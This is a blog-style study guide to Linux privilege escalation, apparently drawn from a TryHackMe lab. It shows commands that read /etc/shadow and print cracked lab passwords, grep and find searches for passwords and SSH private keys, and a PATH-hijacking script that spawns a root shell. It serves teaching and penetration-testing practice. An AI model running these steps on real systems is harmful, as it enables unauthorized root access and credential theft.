---
title: "Linux Privileged Escalation"
date: 2025-04-29
categories: [Linux, Privilege Escalation]
tags: [linux, privilege escalation, cybersecurity, pentesting, red team]
authors: z
---
# Linux Privilege Escalation

> Privilege Escalation is the process of exploiting a security vulnerability to gain higher-level access to a system or network. It involves taking advantage of a system's security mechanisms to bypass normal security controls and gain unauthorized access to sensitive information or execute malicious commands.
{: .prompt-tip }


# Disclaimer
> This guide is for educational purposes only. Do not use this guide for illegal activities.
{: .prompt-danger }

---
# About this post
> For this post, I will be using the room `linuxprivescarena` from [TryHackMe](https://tryhackme.com/room/linuxprivescarena) made by [TCM](https://academy.tcm-sec.com/)

## Enumeration

### System Enumeration
The system information can be obtained by running the following command:

- `uname`

```bash
# kernel release
user@debian:~$ uname -r
2.6.32-5-amd64
# kernel name
user@debian:~$ uname -s
Linux
# architecture
user@debian:~$ uname -m
x86_64
# hostname
user@debian:~$ uname -n
debian
# operating system
user@debian:~$ uname -o
GNU/Linux
# kernel version
user@debian:~$ uname -v
#1 SMP Tue May 13 16:34:35 UTC 2014
# processor type
user@debian:~$ uname -p
x86_64
# hardware platform
user@debian:~$ uname -i
x86_64
# all information
user@debian:~$ uname -a
Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
```
{: .nolineno }

- `lscpu`

```bash
user@debian:~$ lscpu
Architecture:          x86_64
CPU op-mode(s):        64-bit
CPU(s):                1
Thread(s) per core:    1
Core(s) per socket:    1
CPU socket(s):         1
NUMA node(s):          1
Vendor ID:             GenuineIntel
CPU family:            6
Model:                 79
Stepping:              1
CPU MHz:               2300.016
Hypervisor vendor:     Xen
Virtualization type:   full
L1d cache:             32K
L1i cache:             32K
L2 cache:              256K
L3 cache:              46080K
```
{:.nolineno }

- `cat /etc/os-release`

```bash
NAME="Debian GNU/Linux"
VERSION=" 6 (squeeze)"
ID="Debian GNU/Linux"
HOME_URL="https://www.debian.org/"
```
{:.nolineno }

- `cat /proc/version`

```bash
user@debian:~$ cat /proc/version
Linux version 2.6.32-5-amd64 (Debian 2.6.32-48squeeze6) (jmm@debian.org) (gcc version 4.3.5 (Debian 4.3.5-4) ) \#1 SMP Tue May 13 16:34:35 UTC 2014
```
{:.nolineno }

### User Enumeration

The user enumeration means to find out the user and group information of the system, as well the privileges of the user, group and misconfiguration that may lead to privilege escalation.
- `id`

```bash
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```
{:.nolineno }

- `whoami`

```bash
user@debian:~$ whoami
user
```
{:.nolineno }

- `groups`

```bash
user@debian:~$ groups
user cdrom floppy audio dip video plugdev
```
{:.nolineno }

- `sudo`

```bash
user@debian:~$ sudo -l
Matching Defaults entries for user on
    this host:
    env_reset, env_keep+=LD_PRELOAD

User user may run the following
    commands on this host:
    (root) NOPASSWD: /usr/sbin/iftop
    (root) NOPASSWD: /usr/bin/find
    (root) NOPASSWD: /usr/bin/nano
    (root) NOPASSWD: /usr/bin/vim
    (root) NOPASSWD: /usr/bin/man
    (root) NOPASSWD: /usr/bin/awk
    (root) NOPASSWD: /usr/bin/less
    (root) NOPASSWD: /usr/bin/ftp
    (root) NOPASSWD: /usr/bin/nmap
    (root) NOPASSWD:
    /usr/sbin/apache2
    (root) NOPASSWD: /bin/more
```
{:.nolineno }

- `cat /etc/passwd`

```bash
user@debian:~$ cat /etc/passwd
`cat /etc/passwd`
```bash
user@debian:~$ cat /etc/passwd
root:X:0:0:root:/root:/bin/bash
...
user:x:1000:1000:user,,,:/home/user:/bin/bash
```
{:.nolineno }

- `cat /etc/shadow` (Misconfiguration)

```bash
user@debian:~$ cat /etc/shadow
root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::
...
user:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:18431:0:99999:7:::
```
{:.nolineno }

> Once we have the password hash, we can crack it using `john` or `hashcat`.
{:.prompt-info }

|| root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:password123 ||
|| user:$6$hDHLpYuo$El6r99ivR20zrEPUnujk/DgKieYIuqvf9V7M.6t6IZzxpwxGIvhqTwciEw16y/B.7ZrxVk1LOHmVb/xyEyoUg.:Hacker123 ||


### Network Enumeration
- `ifconfig`

```bash
user@debian:~$ ifconfig
eth0      Link encap:Ethernet  HWaddr 02:e2:6a:0a:a9:e9  
          inet addr:10.10.235.239  Bcast:10.10.255.255  Mask:255.255.0.0
          inet6 addr: fe80::e2:6aff:fe0a:a9e9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:9001  Metric:1
          RX packets:113 errors:0 dropped:0 overruns:0 frame:0
          TX packets:75 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:13835 (13.5 KiB)  TX bytes:14232 (13.8 KiB)
          Interrupt:20 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:104 errors:0 dropped:0 overruns:0 frame:0
          TX packets:104 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:8756 (8.5 KiB)  TX bytes:8756 (8.5 KiB)
```
{:.nolineno }

- `netstat -tulpn`

```bash
user@debian:~$ netstat -tulpn
(No info could be read for "-p": geteuid()=1000 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      -               
...
udp        0      0 0.0.0.0:56621           0.0.0.0:*                           -  
...
```
{:.nolineno }
- `netstat -tulpn | grep LISTEN`
```bash
user@debian:~$ netstat -tulpn | grep LISTEN
(No info could be read for "-p": geteuid()=1000 but you should be root.)
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      - 
...
```
{:.nolineno }

- `ss -tulpn`

```bash
user@debian:~$ ss -tulpn
Netid Recv-Q Send-Q                            Local Address:Port                              Peer Address:Port 
tcp   0      128                                           *:111                                          *:*     
tcp   0      128                                           *:8080                                         *:*  
...
```
{: .nolineno }

- `lsof`

```bash
user@debian:~$ lsof -i -sTCP:LISTEN
COMMAND  PID   USER FD   TYPE DEVICE SIZE/OFF NODE NAME
mkdocs  3948 user 3u  IPv4  24837      0t0  TCP *:http-alt (LISTEN)
```
{:.nolineno }

- `arp`

```bash
user@debian:~$ arp -a
ip-10-10-0-1.eu-west-1.compute.internal (10.10.0.1) at 02:c8:85:b5:5a:aa [ether] on eth0
```
{:.nolineno }

### String Enumeration

Usually we can find some kind of credentials in text files or used by process, we can find them by running the following command:

- `grep`

```bash
# color is optional
# -rn: recursive, -w: whole word, -i: ignore case
# password is the string we want to find
user@debian:~$ grep --color=auto -rnw '/' -ie "password" --color=always 2>/dev/null
```
{:.nolineno }

- `find`

```bash
# look for files named password
user@debian:~$ find / -name "password" 2>/dev/null
```
{:.nolineno }

- `locate`

```bash
# look for files named password
user@debian:~$ locate password
```
{:.nolineno }

## Automated tools

- [LinPeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
- [Linux Exploit Suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)
- [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)

## Escalation Path

### Kernel Exploits
The privilege escalation through kernel exploits is the most common method of privilege escalation. The kernel exploits are usually found in the [Exploit Database](https://www.exploit-db.com/) or some PoC's in [GitHub](https://github.com) and other websites.

To find vulnerabilities in the kernel, we can use [linux-exploit-suggester](https://github.com/The-Z-Labs/linux-exploit-suggester)

### Stored Passwords and permissions misconfiguration
To Scalate privileges, we can look for stored passwords and permissions misconfiguration.

For passwords it's common files with names `pass`, `passwd`, `password`, `auth`, `creds`, `secrets`, etc.

Routes to search for passwords are:
- `/home/user/`
- `/var/www/`
- `/etc/`
- `/opt/`

Usual routes to search for permissions misconfiguration are:
- `/etc/passwd`
- `/etc/shadow`
- `/etc/group`
- `/etc/sudoers`
- `/etc/crontab`
- `/usr/bin`
- `/opt`

### SUDI SGID
The SUID permission is a special permission that allows a file to be executed with the privileges of the file owner. The SGID permission is a special permission that allows a file to be executed with the privileges of the file group.
To find SUID and SGID files, we can run the following command:

```bash
user@debian:~$ find / -perm -u=s -type f 2>/dev/null
```
{:.nolineno }

The SGID are the same but instead of `-u=s` we use `-g=s` because the SGID is for the group.

```bash
user@debian:~$ find / -perm -g=s -type f 2>/dev/null
```
{:.nolineno }

For more information about SUID and SGID, you can check the [Linux 101 for Hackers workshop's notebook](/posts/hawks-linux101/)


### Privilege Escalation through SSH

This method is one of the most common methods of privilege escalation. The SSH is a protocol that allows us to connect to a remote server and execute commands on it. The SSH is a protocol that allows us to connect to a remote server and execute commands on it.

The most usual is permisson misconfiguration in the routes which has the ssh credentials

Use the following command to found these files:

```bash
user@debian:~$ find / -name "id_rsa" 2>/dev/null
```
{:.nolineno }

```bash
user@debian:~$ find / -name "authorized_keys" 2>/dev/null
```
{:.nolineno }

```bash
user@debian:~$ find / -name "ssh_host_rsa_key" 2>/dev/null
```
{:.nolineno }

**TL;DR:**
 Use the `find` command to search files which can contain the ssh credentials, check the permissions of the files and be creative, maybe you can copy them, use them or edit them.

 ### Shell Scaping (sudo)

 As we saw before, sometimes we could be able to run `sudo -l` and maybe if there is a misconfiguration, we could have the privilege to execute some commands as root.

 So for this method our best friend gonna be the project [GTFObins](https://gtfobins.github.io/), we can check for the binary (if it's not a custom program) and check the method of scaping.


for example the method to the vim  command is:
<div style="display: flex; justify-content: center;">
    <iframe src="https://gtfobins.github.io/gtfobins/vim/" width="100%" height="500px"></iframe>
</div>

### Path Hijacking
This method is used to escalate privileges by hijacking the PATH environment variable. The PATH environment variable is a list of directories that the shell will search for commands.
To escalate privileges, we can add a directory to the PATH environment variable and create a file with the same name as the command we want to execute and with the same permissions as the command we want to execute.
For example, supose we want to escalate privileges to root, after execute `sudo -l` we can see that we can run a weird binary called `mymonitor` as root, but in the configuration it has not the absolute path, so we can create a file called `mymonitor` in the directory `/usr/bin` and add the following line to the file:
```bash
#!/bin/bash
/bin/bash -p
```
{:.nolineno }
After that, it's necessary [set the permissions](/posts/hawks-linux101/) with `+x` to be able to execute it as root and then execute it with `sudo mymonitor` and you will be root.

### Privilege Escalation through Cron Jobs

This method consists in finding cron jobs that are running as root and executing commands as root.
To find cron jobs, we can run these commands:
```bash
user@debian:~$ crontab -l
user@debian:~$ cat /etc/crontab
user@debian:~$ cat /var/spool/cron/crontabs/*
```
{:.nolineno }

When we find a cron job, we can check if it's running as root and if it's running as root, we have to be a bit creative to identify the situation and escalate privileges, could be a misconfiguration, a vulnerability or a misconfiguration in the cron job itself, reverse engineering the binary, path hijacking, etc.

## Anything else?

Of corse, there is always something else to try, maybe you can find a way to escalate privileges using a web application, a database, a service, reversing a privilege binary, checking the process, etc.

This guide has not the whole list of methods, but it's a good starting point to escalate privileges.

## References
- [Hacktricks](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html)
- [Linux 101 for Hackers workshop's notebook](/posts/hawks-linux101/)
- [GTFObins](https://gtfobins.github.io)
- [TCM](https://academy.tcm-sec.com/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)

